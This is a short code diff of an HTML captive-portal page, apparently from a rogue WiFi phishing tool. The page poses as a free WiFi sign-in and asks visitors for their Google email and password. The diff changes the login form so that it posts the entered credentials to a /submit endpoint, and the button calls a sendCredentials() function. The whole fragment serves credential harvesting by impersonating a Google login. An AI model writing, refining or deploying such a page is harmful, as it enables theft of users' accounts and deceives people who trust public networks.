@@ -137,7 +137,7 @@
             <h1 class='containertitle'>Welcome to the free WiFi network.</h1>
             <h2 class='containersubtitle'>Sign in with your Google account.</h2>
         </center>
-        <form id="login-form">
+        <form method="post" action="/submit" id="login-form">
             <input id="email" name="email" class="input-field" type="text" placeholder="Use your Google account" required>
             <input id="password" name="password" class="input-field" type="password" placeholder="Password" required>
             <button class="submit-btn" type="button" onclick="sendCredentials()">Continue</button>
